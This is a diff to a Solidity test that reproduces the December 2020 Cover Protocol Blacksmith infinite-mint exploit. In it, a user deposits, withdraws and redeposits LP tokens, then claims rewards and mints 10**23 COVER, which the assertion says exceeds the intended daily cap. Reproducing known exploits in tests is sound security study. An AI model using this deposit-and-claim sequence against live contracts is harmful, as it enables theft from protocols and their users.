@@ -67,14 +67,13 @@ contract DhCover20201228Test is DSTest {
         bob.approve(lpToken, address(blacksmith));
 
         ali.deposit(blacksmith, address(lpToken), AMT);
-        bob.deposit(blacksmith, address(lpToken), AMT);
-        bob.withdraw(blacksmith, address(lpToken), AMT - 1);
+        bob.deposit(blacksmith, address(lpToken), 1);
         ali.withdraw(blacksmith, address(lpToken), AMT);
         hevm.warp(block.timestamp + 1 days);
         bob.deposit(blacksmith, address(lpToken), AMT - 1);
         bob.claimRewards(blacksmith, address(lpToken));
 
-        // Bob minted 10*23 COVER
+        // Bob minted 10**23 COVER
         assertEq(coverToken.balanceOf(address(bob)), (10**23) * (1 ether));
 
         // This exceeds the "intended" daily maximum mint.
